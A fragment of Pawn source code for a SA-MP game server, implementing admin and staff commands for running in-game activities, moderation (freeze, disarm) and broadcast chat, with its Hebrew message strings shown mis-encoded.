			strcat(dia," /act full :ющьхщ фчщщэ хфютя ьыь ф∙чўЁщэ сЇЄщьхщх·\n");
			strcat(dia," /act setcolor :∙щЁхщ фЎсЄ ∙ь ыь ∙чўЁщ фЇЄщьх·\n");
			strcat(dia," /act tk :сщшхь хфЇЄь· рЁшщ шщэ ўщь сЇЄщьх·\n");
			strcat(dia," /act cmd [command] :ьюўхэ сх Ў°щъ ь°∙хэ рщщущ ∙ь ф∙чўя ID сщЎхЄ Їўхуф Єь ∙чўЁщ ЇЄщьх·, щ∙ ьф∙·ю∙ с\n");
			strcat(dia," /act say [text] :Ї°ёхэ шўёш ь∙чўЁщ фЇЄщьх·\n");
			strcat(dia," /act adv :Ї°ёхэ фЇЄщьх·\n");
			strcat(dia," /act admin :рЇ∙°хщх· рующя Ї∙хшх· у°ъ ·Ї°щш\n");
			strcat(dia,@c(red) " * рщя ьф∙·ю∙ сЇўхуф сьщ ьуЄ· сххурх· юф фщр Єх∙ф *");
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рЇ∙°хщх· рующя ьЇЄщьх· щуЁщ·",dia,"OK","");
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			#endif
			if(thereIsAct || actinfo[actExist]) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх·");
			new actn[256];
			cmd = strtok(cmdtext,idx), actn = strrest(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd) || !strlen(actn))
			{
				SendClientMessage(playerid,white," /act start [need vehicle? 0/1/2] [name] :Ўх°· ф∙щюх∙");
				return SendClientMessage(playerid,white," 0 = Єэ рх сьщ °ыс X 1 = °ў сьщ °ыс X 2 = °ў Єэ °ыс");
			}
			actinfo[actExist] = 1;
			//actinfo[actPlayers] = 1;
			actinfo[actMax] = GetMaxPlayers();
			format(actinfo[actName],256," %s",actn);
			actinfo[actEndJoin] = 0;
			actinfo[actTK] = false;
			actinfo[actAdmin] = playerid;
			actinfo[actNeedVehicle] = strval(cmd) < 0 && strval(cmd) > 2 ? 0 : strval(cmd);
			SendClientMessageToAll(black,"___________________________________");
			format(string,sizeof(string)," :ф·чщь ЇЄщьх· %s фрующя",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(blue,actn);
			SendClientMessageToAll(yellow," /act join :ьфЎш°Їх· °∙юх р· фЇўхуф");
			SendClientMessageToAll(black,"___________________________________");
			thereIsAct = true;
		}
		else if(equal(cmd,"end"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) cmd = "рщя";
			format(string,sizeof(string)," :ёт° р· фЇЄщьх· %s фрующя",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(lightblue,actinfo[actName]);
			SendClientMessageToAll(lightblue," :юфёщсф");
			SendClientMessageToAll(lightblue,cmd);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact])
			{
				if(IsPlayerInAnyVehicle(i)) SetVehicleToRespawn(GetPlayerVehicleID(i));
				SpawnPlayer(i);
				playerinfo[i][inact] = 0;
			}
			actinfo[actExist] = 0;
			actinfo[actPlayers] = 0;
			actinfo[actMax] = GetMaxPlayers();
			actinfo[actName] = 0;
			actinfo[actEndJoin] = 0;
			actinfo[actAdmin] = -1;
			actinfo[actNeedVehicle] = 0;
			actinfo[actTK] = false;
			thereIsAct = false;
		}
		else if(equal(cmd,"name"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act name [name] :Ўх°· ф∙щюх∙");
			format(actinfo[actName],256,cmd);
			format(string,sizeof(string)," :∙щЁф р· ∙э фЇЄщьх· ь %s фрующя",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SendClientMessageToAll(lightblue,cmd);
		}
		else if(equal(cmd,"max"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			new max1 = !strlen(cmd) || !IsNumeric(cmd)? GetMaxPlayers():strval(cmd);
			if(max1 < 2 || max1 > GetMaxPlayers()) return SendClientMessage(playerid,red," .юёЇ° юўёщюрьщ ∙ь ∙чўЁщэ тухь рх ўшя юущ");
			actinfo[actMax] = max1;
			format(string,sizeof(string)," .∙щЁф р· юёЇ° фюЎш°Їщэ фюрўёщюрьщ ь %d %s фрующя",max1,GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"endjoin"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act endjoin [close/open] :Ўх°· ф∙щюх∙");
			if(equal(cmd,"close"))
			{
				actinfo[actEndJoin] = 1;
				format(string,sizeof(string)," .ёт° р· фрЇ∙°х· ьфЎш°є ьЇЄщьх· %s фрующя",GetName(playerid));
			}
			else if(equal(cmd,"open"))
			{
				actinfo[actEndJoin] = 0;
				format(string,sizeof(string)," .Ї·ч р· фрЇ∙°х· ьфЎш°є ьЇЄщьх· %s фрующя",GetName(playerid));
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"get"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			new Float:p[3], withv = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd);
			if(withv < 0 && withv > 1) return SendClientMessage(playerid,red," .рЇ∙°х· ∙щтх° Єэ °ыс ∙тхщф");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid)
			{
				if(withv && IsPlayerInAnyVehicle(i))
				{
					SetVehiclePos(GetPlayerVehicleID(i),p[0]+floatrand(-3.0,3.0),p[1]+floatrand(-3.0,3.0),p[2],playerid);
					LinkVehicleToInterior(GetPlayerVehicleID(i),GetPlayerInterior(playerid));
					SetVehicleVirtualWorld(GetPlayerVehicleID(i),GetPlayerVirtualWorld(playerid));
				}
				else
				{
					SetPlayerPos(i,p[0]+floatrand(-1.0,1.0),p[1]+floatrand(-1.0,1.0),p[2]);
					SetPlayerInterior(i,GetPlayerInterior(playerid));
					SetPlayerVirtualWorld(i,GetPlayerVirtualWorld(playerid));
				}
			}
			format(string,sizeof(string)," .∙щт° рьщх р· ыь ф∙чўЁщэ ∙сЇЄщьх· %s фрующя",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"tk"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /act tk [on/off] :Ўх°· ф∙щюх∙");
        	if(equal(cmd,"on"))
        	{
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) SetPlayerTeam(i,232);
				format(string,sizeof(string)," .фЇЄщь рЁшщ шщэ ўщь сЇЄщьх· %s фрующя",GetName(playerid));
				actinfo[actTK] = true;
			}
  			else if(equal(cmd,"off"))
        	{
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) TeamDefines(i);
				format(string,sizeof(string)," .сщшь р· фрЁшщ шщэ ўщь сЇЄщьх· %s фрующя",GetName(playerid));
				actinfo[actTK] = false;
			}
			else return SendClientMessage(playerid,lightblue,".рхЇЎщф ∙тхщф");
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"sethealth"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			new Float:h;
			cmd = strtok(cmdtext,idx);
			h = floatstr(cmd);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /act sethealth [health] :Ўх°· ∙щюх∙");
			if(!playerinfo[playerid][pp] && (h < 0.0 || h > 100.0)) return SendClientMessage(playerid,red," .рчхц чщщэ ∙тхщ");
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) SetPlayerHealth(i,h);
			format(string,sizeof(string)," .%f ∙щЁф р· рчхц фчщщэ ∙ь ыь фю∙··Їщэ сЇЄщьх· ь %s фрующя",h,GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"setarmour"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			new Float:h;
			cmd = strtok(cmdtext,idx);
            if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /act setarmour [armour] :Ўх°· ∙щюх∙");
			h = floatstr(cmd);
			if(!playerinfo[playerid][pp] && (h < 0.0 || h > 100.0)) return SendClientMessage(playerid,red," .рчхц ютя ∙тхщ");
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) SetPlayerArmour(i,h);
			format(string,sizeof(string)," .%f ∙щЁф р· рчхц фютя ∙ь ыь фю∙··Їщэ сЇЄщьх· ь %s фрующя",h,GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"full"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact])
			{
			SetPlayerHealth(i,100.0);
			SetPlayerArmour(i,100.0);
			}
			format(string,sizeof(string)," .ющьр р· фчщщэ хфютя ьыь фю∙··Їщэ сЇЄщьх· %s фрующя",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"gw"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act gw [weapon id/name] [ammo] :Ўх°· ф∙щюх∙");
			new weaponid = IsNumeric(cmd) ? strval(cmd) : GetWeaponIDFromName(cmd);
			if(weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21) return SendClientMessage(playerid,red," .∙э Ё∙ў рх юёЇ° ∙тхщ");
			cmd = strtok(cmdtext,idx);
			new ammo2 = !strlen(cmd) || !IsNumeric(cmd) ? 100000 : strval(cmd);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) GiveWeapon(i,weaponid,ammo2);
			format(string,sizeof(string)," .%s фсщр ьыь фю∙··Їщэ сЇЄщьх· р· фЁ∙ў %s фрующя",WeaponName(weaponid),GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"freeze"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			if(!equal(cmd,"on") && !equal(cmd,"off")) return SendClientMessage(playerid,red," .рЇ∙°х· фўЇрф ∙тхщф");
			new frz = !strlen(cmd) || IsNumeric(cmd)? 0:(equal(cmd,"on")? 1:0);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid) SetFreeze(i,frz,true);
			format(string,sizeof(string),frz? (" .фўЇщр р· ыь ф∙чўЁщэ ∙сЇЄщьх· %s фрующя"):(" .фх°щу р· ффўЇрф ьыь ф∙чўЁщэ ∙сЇЄщьх· %s фрующя"),GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"disarm"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) ResetWeapons(i);
			format(string,sizeof(string)," .фх°щу р· фЁ∙ўщэ ьыь ф∙чўЁщэ ∙сЇЄщьх· %s фрующя",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd,"gw"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act gw [weapon id/name] [ammo] :Ўх°· ф∙щюх∙");
			new weaponid = IsNumeric(cmd) ? strval(cmd) : GetWeaponIDFromName(cmd);
			if(weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21) return SendClientMessage(playerid,red," .∙э Ё∙ў рх юёЇ° ∙тхщ");
			cmd = strtok(cmdtext,idx);
			new ammo2 = !strlen(cmd) || !IsNumeric(cmd) ? 100000 : strval(cmd);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][inact]) GiveWeapon(i,weaponid,ammo2);
			format(string,sizeof(string)," .%s фсщр ьыь фю∙··Їщэ сЇЄщьх· р· фЁ∙ў %s фрующя",WeaponName(weaponid),GetName(playerid));
			SendClientMessageToAll(lightblue,string);
		}
		else if(equal(cmd, "say"))
		{
		    if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
            if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
            cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /act say [text] :Ўх°· ф∙щюх∙");
			new len = strlen(cmd);
			if(len < 3 || len > 80) return SendClientMessage(playerid, red, " .ффхуЄф ўЎ°ф рх р°хыф юущ");
			new str[M_S];
			format(str, sizeof(str), " * Activity Message: "@c(white)"%s", cmd);
			for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][inact]) SendClientMessage(x, green, str);
		} // /act addplayer
		else if(equal(cmd, "adv"))
		{
		    if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
            if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			new str[M_S];
            format(str, sizeof(str), "[Activity]: /Act Join - ю°щї ЇЄщьх· щуЁщ·. ьфЎш°Їх· "@c(white)"%s"@c(lightblue)" фрующя", GetName(playerid));
			SendClientMessageToAll(lightblue, str);
		}
		else if(equal(cmd,"cmd"))
		{
			if(!IsPlayerMAdmin(playerid) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /act cmd [command] :Ўх°· ф∙щюх∙");
				return SendClientMessage(playerid,white," /act cmd /sethealth ID 100 :ухтюф ь∙щюх∙");
			}
			new c = 0;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && i != playerid)
			{
				valstr(string,i);
				SetTimerEx("OnPlayerCommandText",250*(++c),0,"is",playerid,strreplace(cmd,"ID",string));
			}
		}
		else if(equal(cmd,"admin"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Їўхуф цх юх°∙· ь∙щюх∙ Єь щущ рующЁщэ сьсу");
			if(!actinfo[actExist]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ЇхЄь·");
			playerinfo[playerid][range] = 0.0, playerinfo[playerid][clickplayer] = INVALID_PLAYER_ID, playerinfo[playerid][attype] = at_act;
			ShowPlayerConstDialog(playerid,dialog_admintotal);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ЇЄщьх· ∙тхщф");
		return 1;
	}
	if(cmdtext[1] == '/' && IsPlayerMAdmin(playerid))
	{
	    if(achatlocked == 1) if(playerinfo[playerid][admin] < 17) return SendClientMessage(playerid,red,".фЎ'рш рующЁщэ ЁЄхь");
		new ac[M_S], string[M_S];
		strmid(ac,cmdtext,2,strlen(cmdtext));
		format(string,sizeof(string),"[AC] %s (ID: %03d | %d): %s",GetName(playerid),playerid,playerinfo[playerid][admin],ac);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (IsPlayerMAdmin(i) || playerinfo[i][sadmin])) SendClientMessage(i,playerinfo[i][sadmin] ? 0xF7A26FFF : 0xFF9900AA,string);
		Log("AdminChat",playerid,string);
		printf(string);
		return 1;
	}
	if(equal(cmd,"/inv") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /inv [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			SetPlayerColor(playerid,rgba2hex(255,255,255,0));
			playerinfo[playerid][pinv] = 1;
			SendClientMessage(playerid,green," .юЎс сь·щ Ё°рф юхЇЄь");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
			playerinfo[playerid][pinv] = 0;
			if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) SetFreeze(playerid,0);
			SendClientMessage(playerid,green," .юЎс сь·щ Ё°рф юхЇёў");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/sms") && (IsPlayerMAdmin(playerid)))
	{
		if((playerinfo[playerid][admin] < 17) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sms [text] :Ўх°· ф∙щюх∙");
		SendClientMessageToAll(red,"____________________Server Management Message____________________");
		format(string,sizeof(string),"%s: %s",GetName(playerid),cmd);
		SendClientMessageToAll(-1,string);
		SendClientMessageToAll(red,"____________________Server Management Message____________________");
		AdminInfo(playerid,cmd);
		return 1;
	}
	if(equal(cmd,"/say") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /say [text] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string)," * Admin: %s",cmd);
		SendClientMessageToAll(0x2587CEAA,string);
		AdminInfo(playerid, cmd);
		return 1;
	}
	if(equal(cmd,"/asay") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(chatlocked && !playerinfo[playerid][lcallow]) return SendClientMessage(playerid,red," .фЎ'рш ЁЄхь ы°тЄ, рщЁъ щыхь ьы·хс"), 1;
		//if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·")) && !PlayerHasRank(playerid,RankID("Ўхх· ·ющыф"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S], title[16];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /asay [text] :Ўх°· ф∙щюх∙");
		if(IsPlayerMAdmin(playerid)) title = "Admin";
		else if(PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) title = "Staff Member";
		//else if(PlayerHasRank(playerid,RankID("Ўхх· ·ющыф"))) title = "Helper";
		format(string,sizeof(string)," * %s %s: %s",title,GetName(playerid),cmd);
		SendClientMessageToAll(0x2587CEAA,string);
		return 1;
	}
	if(equal(cmd,"/djsay") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("∙у°Ёщэ"))))
	{
  		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("∙у°Ёщэ"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сўсхЎ· ф∙у°Ёщэ сыущ ьсЎЄ Їўхуф цх");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /djsay [text] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string)," * DJ %s: %s",GetName(playerid),cmd);
		SendClientMessageToAll(0x2587CEAA,string);
		return 1;
	}
	if((equal(cmd,"/f") || equal(cmd,"/freeze")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /freeze(f) [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][firstspawn]) return SendClientMessage(playerid,red," .Ёёф ∙хс сЄху ыюф ∙Ёщх·");
		if(playerinfo[id][mission] != INVALID_MISSION_ID) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф Єь ∙чўя цф сцюя ю∙щюф");
		if(playerinfo[id][frozen][0]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ыс° сфўЇрф");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		SetFreeze(id,1,true);
		format(string,sizeof(string)," *** %s has been frozen by %s. (%s)",GetName(id),GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/unf") || equal(cmd,"/unfreeze")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unfreeze(unf) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][firstspawn]) return SendClientMessage(playerid,red," .Ёёф ∙хс сЄху ыюф ∙Ёщх·");
		playerinfo[id][frozen][1] = 0;
		SetFreeze(id,0,false);
		format(string,sizeof(string)," *** %s has been unfrozen by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/d") || equal(cmd,"/disarm")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /disarm(d) [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		ResetWeapons(id);
		format(string,sizeof(string)," *** %s has been disarmed by %s. (%s)",GetName(id),GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/settime") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new h, string[M_S];
